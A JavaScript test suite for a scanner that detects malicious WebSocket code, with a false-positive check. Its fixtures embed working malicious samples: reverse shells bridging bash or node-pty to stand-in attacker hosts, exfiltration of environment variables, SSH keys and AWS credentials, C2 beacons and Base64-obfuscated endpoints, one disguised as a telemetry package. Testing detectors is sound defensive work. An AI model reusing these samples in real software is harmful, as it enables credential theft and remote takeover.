/**
 * Test Suite: Malicious WebSocket Handler Scanner
 * 
 * Covers:
 *   TC-01  Suspicious endpoint (raw IP)
 *   TC-02  Data exfiltration of process.env
 *   TC-03  Reverse shell via WebSocket + spawn
 *   TC-04  C2 beacon with setInterval reconnect loop
 *   TC-05  Obfuscated WebSocket URL construction
 *   TC-06  Combined multi-vector attack (high score)
 *   TC-07  Clean legitimate WebSocket usage (no false positive)
 *   TC-08  Encoded endpoint (atob / Base64)
 *   TC-09  Incoming message triggers exec (RCE)
 *   TC-10  Exfiltration of SSH private key file
 *
 * Run: node websocket_malicious_handlers.test.js
 */

"use strict";

const {
  scan,
  formatReport,
  SCORE_THRESHOLD,
} = require("./websocket_malicious_handlers");

// ─── Minimal Test Harness ─────────────────────────────────────────────────────

let passed = 0;
let failed = 0;
const failures = [];

function assert(condition, message) {
  if (condition) {
    passed++;
    console.log(`  ✅ PASS: ${message}`);
  } else {
    failed++;
    failures.push(message);
    console.log(`  ❌ FAIL: ${message}`);
  }
}

function describe(suiteName, fn) {
  console.log(`\n${"─".repeat(60)}`);
  console.log(`📦 ${suiteName}`);
  console.log("─".repeat(60));
  fn();
}

function it(testName, fn) {
  console.log(`\n  🔍 ${testName}`);
  fn();
}

// ─── Test Cases ───────────────────────────────────────────────────────────────

describe("TC-01: Suspicious WebSocket Endpoint (Raw IP)", () => {
  it("should flag a WebSocket connection to a raw IP address", () => {
    const source = `
      // Totally normal module init
      const ws = new WebSocket('ws://192.168.1.100:4444/cmd');
      ws.onopen = () => ws.send('ready');
    `;
    const result = scan(source, "tc01-raw-ip.js");

    assert(result.flagged, "file should be flagged");
    assert(result.score >= SCORE_THRESHOLD, `score (${result.score}) >= threshold (${SCORE_THRESHOLD})`);
    assert(
      result.matches.some(m => m.category === "Suspicious WebSocket Endpoint"),
      "should detect suspicious endpoint"
    );

    console.log(formatReport(result));
  });
});

describe("TC-02: Data Exfiltration of process.env", () => {
  it("should detect exfiltration of environment variables over WebSocket", () => {
    const source = `
      const WebSocket = require('ws');
      const ws = new WebSocket(process.env.C2_SERVER);

      ws.on('open', function open() {
        ws.send(JSON.stringify(process.env));
      });
    `;
    const result = scan(source, "tc02-env-exfil.js");

    assert(result.flagged, "file should be flagged");
    assert(
      result.matches.some(m => m.category === "Suspicious WebSocket Endpoint"),
      "should detect env-var endpoint"
    );
    assert(
      result.matches.some(m => m.category === "Data Exfiltration via WebSocket"),
      "should detect env exfiltration"
    );

    console.log(formatReport(result));
  });
});

describe("TC-03: Reverse Shell via WebSocket + spawn", () => {
  it("should detect a reverse shell bridging /bin/bash to a WebSocket", () => {
    const source = `
      const { spawn } = require('child_process');
      const WebSocket = require('ws');

      const ws = new WebSocket('wss://attacker.ngrok.io/shell');
      ws.on('open', () => {
        const shell = spawn('/bin/bash', ['-i']);
        shell.stdout.on('data', (data) => ws.send(data));
        shell.stderr.on('data', (data) => ws.send(data));
        ws.on('message', (cmd) => shell.stdin.write(cmd));
      });
    `;
    const result = scan(source, "tc03-reverse-shell.js");

    assert(result.flagged, "file should be flagged");
    assert(result.score >= 40, "score should reflect high severity");
    assert(
      result.matches.some(m => m.category === "Reverse Shell via WebSocket"),
      "should detect reverse shell pattern"
    );
    assert(
      result.matches.some(m => m.category === "Suspicious WebSocket Endpoint"),
      "should flag ngrok endpoint"
    );

    console.log(formatReport(result));
  });
});

describe("TC-04: C2 Beacon with Reconnect Loop", () => {
  it("should detect a persistent C2 beacon using setInterval and auto-reconnect", () => {
    const source = `
      const WebSocket = require('ws');

      function connect() {
        const ws = new WebSocket('wss://c2.evil-domain.xyz/beacon');
        
        // Send heartbeat every 30 seconds
        const heartbeat = setInterval(() => {
          ws.send(JSON.stringify({ type: 'beacon', host: require('os').hostname() }));
        }, 30000);

        // Reconnect on close — persistent C2 channel
        ws.on('close', () => {
          clearInterval(heartbeat);
          setTimeout(connect, 5000);
        });
      }

      connect();
    `;
    const result = scan(source, "tc04-c2-beacon.js");

    assert(result.flagged, "file should be flagged");
    assert(
      result.matches.some(m => m.category === "C2 Beacon / Heartbeat"),
      "should detect beacon pattern"
    );

    console.log(formatReport(result));
  });
});

describe("TC-05: Obfuscated WebSocket URL (Base64 Encoded)", () => {
  it("should detect Base64-obfuscated WebSocket endpoint construction", () => {
    const source = `
      // "ws://malicious-c2.io:9001/exfil" encoded
      const endpoint = atob('d3M6Ly9tYWxpY2lvdXMtYzIuaW86OTAwMS9leGZpbA==');
      const ws = new WebSocket(endpoint);
      ws.onopen = () => {
        ws.send(JSON.stringify({ data: require('fs').readFileSync('/etc/passwd', 'utf8') }));
      };
    `;
    const result = scan(source, "tc05-obfuscated-url.js");

    assert(result.flagged, "file should be flagged");
    assert(
      result.matches.some(m => m.category === "Suspicious WebSocket Endpoint"),
      "should detect atob-obfuscated endpoint"
    );

    console.log(formatReport(result));
  });
});

describe("TC-06: Combined Multi-Vector Attack", () => {
  it("should detect and score a sophisticated multi-vector WebSocket attack", () => {
    const source = `
      /**
       * Disguised as a "telemetry" module.
       * Published as 'react-performance-metrics@2.1.4'
       */
      const WebSocket = require('ws');
      const os  = require('os');
      const fs  = require('fs');
      const { exec } = require('child_process');

      // Obfuscated C2 endpoint
      const _0x1a2b = atob('d3NzOi8vMTAuMC4wLjE6NDQ0NC9jMg==');

      function initTelemetry() {
        const ws = new WebSocket(_0x1a2b);

        ws.on('open', () => {
          // Exfiltrate environment (AWS keys, tokens, etc.)
          ws.send(JSON.stringify(process.env));

          // Exfiltrate SSH private key if present
          try {
            const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
            ws.send(JSON.stringify({ type: 'ssh_key', data: key }));
          } catch (_) {}
        });

        // Accept and execute arbitrary commands from C2
        ws.on('message', (cmd) => {
          exec(cmd, (err, stdout) => ws.send(stdout || err.message));
        });

        // Heartbeat beacon
        setInterval(() => {
          ws.send(JSON.stringify({ alive: true, host: os.hostname() }));
        }, 60000);

        // Persistent reconnect
        ws.on('close', () => setTimeout(initTelemetry, 3000));
      }

      module.exports.init = initTelemetry;
    `;
    const result = scan(source, "tc06-multi-vector.js");

    assert(result.flagged, "file should be flagged");
    assert(result.score >= 80, `score (${result.score}) should be very high (>=80) for multi-vector attack`);
    assert(result.matches.length >= 3, `should detect at least 3 attack vectors, found ${result.matches.length}`);

    const categories = result.matches.map(m => m.category);
    assert(categories.includes("Suspicious WebSocket Endpoint"),    "should flag obfuscated endpoint");
    assert(categories.includes("Data Exfiltration via WebSocket"),  "should flag data exfiltration");
    assert(categories.includes("C2 Beacon / Heartbeat"),            "should flag C2 beacon");

    console.log(formatReport(result));
  });
});

describe("TC-07: Clean Legitimate WebSocket Usage (No False Positive)", () => {
  it("should NOT flag a legitimate browser WebSocket client", () => {
    const source = `
      /**
       * Legitimate real-time chat client.
       * Connects to the application's own backend.
       */
      class ChatClient {
        constructor(roomId) {
          this.roomId = roomId;
          this.ws = null;
        }

        connect() {
          // Relative URL — same origin as the page
          this.ws = new WebSocket(\`wss://\${location.host}/chat/\${this.roomId}\`);

          this.ws.addEventListener('open', () => {
            console.log('Chat connected');
          });

          this.ws.addEventListener('message', (event) => {
            const msg = JSON.parse(event.data);
            this.displayMessage(msg);
          });

          this.ws.addEventListener('close', () => {
            console.log('Chat disconnected');
          });
        }

        send(text) {
          if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify({ type: 'message', text }));
          }
        }

        displayMessage(msg) {
          document.getElementById('chat').insertAdjacentHTML(
            'beforeend',
            \`<div class="msg">\${msg.user}: \${msg.text}</div>\`
          );
        }
      }

      export default ChatClient;
    `;
    const result = scan(source, "tc07-legitimate-chat.js");

    assert(!result.flagged, "legitimate chat client should NOT be flagged");
    assert(result.score < SCORE_THRESHOLD, `score (${result.score}) should be below threshold`);
    assert(result.matches.length === 0, `should have zero matches, got ${result.matches.length}`);

    console.log(formatReport(result));
  });
});

describe("TC-08: Incoming Message Triggers exec (Remote Code Execution)", () => {
  it("should detect WebSocket message handler that executes arbitrary commands", () => {
    const source = `
      const WebSocket = require('ws');
      const { exec } = require('child_process');

      const wss = new WebSocket.Server({ port: 0 });

      // Connects back to attacker for commands
      const ws = new WebSocket('ws://10.13.37.1:31337/cmd');

      ws.on('message', function incoming(command) {
        // Execute any command received from C2
        exec(command, (error, stdout, stderr) => {
          ws.send(stdout || stderr || error.toString());
        });
      });
    `;
    const result = scan(source, "tc08-rce-via-message.js");

    assert(result.flagged, "file should be flagged");
    assert(
      result.matches.some(m => m.category === "Reverse Shell via WebSocket"),
      "should detect RCE via message handler"
    );
    assert(
      result.matches.some(m => m.category === "Suspicious WebSocket Endpoint"),
      "should flag raw IP endpoint"
    );

    console.log(formatReport(result));
  });
});

describe("TC-09: Exfiltration of SSH Private Key", () => {
  it("should detect SSH key exfiltration over WebSocket", () => {
    const source = `
      const WebSocket = require('ws');
      const fs = require('fs');
      const os = require('os');

      // Masquerading as a "key backup" utility
      const ws = new WebSocket('wss://backup.attacker.serveo.net/upload');

      ws.on('open', () => {
        const sshKey = fs.readFileSync(os.homedir() + '/.ssh/id_rsa');
        const awsCreds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');

        ws.send(JSON.stringify({
          type: 'key_backup',
          ssh: sshKey.toString('base64'),
          aws: awsCreds,
        }));
      });
    `;
    const result = scan(source, "tc09-ssh-key-exfil.js");

    assert(result.flagged, "file should be flagged");
    assert(
      result.matches.some(m => m.category === "Suspicious WebSocket Endpoint"),
      "should flag serveo.net tunnel endpoint"
    );
    assert(
      result.matches.some(m => m.category === "Data Exfiltration via WebSocket"),
      "should flag SSH key exfiltration"
    );

    console.log(formatReport(result));
  });
});

describe("TC-10: node-pty Reverse Shell via WebSocket", () => {
  it("should detect PTY-based reverse shell using node-pty over WebSocket", () => {
    const source = `
      /**
       * "terminal-widget" npm package — hidden backdoor
       */
      const pty    = require('node-pty');
      const WebSocket = require('ws');

      const ws = new WebSocket(\`wss://\${Buffer.from('dGVybS5hdHRhY2tlci5pbw==', 'base64').toString()}/pty\`);

      ws.on('open', () => {
        const shell = pty.spawn('/bin/bash', [], {
          name: 'xterm-256color',
          cols: 80,
          rows: 30,
        });

        // Bridge PTY <-> WebSocket (full interactive shell)
        shell.on('data', (data) => ws.send(data));
        ws.on('message', (data) => shell.write(data));
      });
    `;
    const result = scan(source, "tc10-pty-reverse-shell.js");

    assert(result.flagged, "file should be flagged");
    assert(
      result.matches.some(m => m.category === "Reverse Shell via WebSocket"),
      "should detect node-pty reverse shell pattern"
    );

    console.log(formatReport(result));
  });
});

// ─── Summary ──────────────────────────────────────────────────────────────────

console.log("\n" + "═".repeat(60));
console.log("📊 TEST SUMMARY");
console.log("═".repeat(60));
console.log(`  Total  : ${passed + failed}`);
console.log(`  Passed : ${passed} ✅`);
console.log(`  Failed : ${failed} ❌`);

if (failures.length > 0) {
  console.log("\n  Failed assertions:");
  failures.forEach(f => console.log(`    • ${f}`));
}

console.log("═".repeat(60));

if (failed > 0) {
  process.exit(1);
} else {
  console.log("\n🎉 All tests passed!\n");
  process.exit(0);
}
